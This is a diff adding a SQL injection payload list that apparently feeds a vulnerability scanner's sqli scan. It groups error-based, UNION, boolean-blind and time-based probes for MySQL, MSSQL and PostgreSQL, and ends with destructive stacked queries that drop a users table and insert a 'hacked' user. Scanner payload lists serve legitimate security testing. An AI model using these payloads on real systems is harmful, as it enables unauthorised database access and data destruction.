@@ -1,0 +1,59 @@
+# SQL Injection Payloads — VulnScanner reference list
+# Usage: python main.py -u "..." --scan-type sqli --payloads payloads/sqli.txt
+#
+# Format: one payload per line.  Lines starting with # are ignored.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── Error-based ──────────────────────────────────────────────────────────────
+'
+"
+\
+'--
+'#
+'/*
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+1' OR '1'='1'--
+1" OR "1"="1"--
+admin'--
+admin'#
+
+# ── UNION-based (column enumeration starters) ─────────────────────────────
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT null--
+
+# ── Boolean-based blind ───────────────────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+' AND 'a'='a
+' AND 'a'='b
+1' AND sleep(0)='0
+
+# ── Time-based blind (MySQL) ──────────────────────────────────────────────
+' OR SLEEP(5)--
+1 OR SLEEP(5)
+' AND SLEEP(5) AND '1'='1
+'; SELECT SLEEP(5)--
+IF(1=1,SLEEP(5),0)--
+
+# ── Time-based blind (MSSQL) ──────────────────────────────────────────────
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'
+' IF(1=1) WAITFOR DELAY '0:0:5'--
+
+# ── Time-based blind (PostgreSQL) ─────────────────────────────────────────
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)
+' OR 1=1 AND pg_sleep(5)--
+
+# ── Second-order / stacked queries ───────────────────────────────────────
+'; DROP TABLE users--
+1; INSERT INTO users VALUES ('hacked','hacked')--
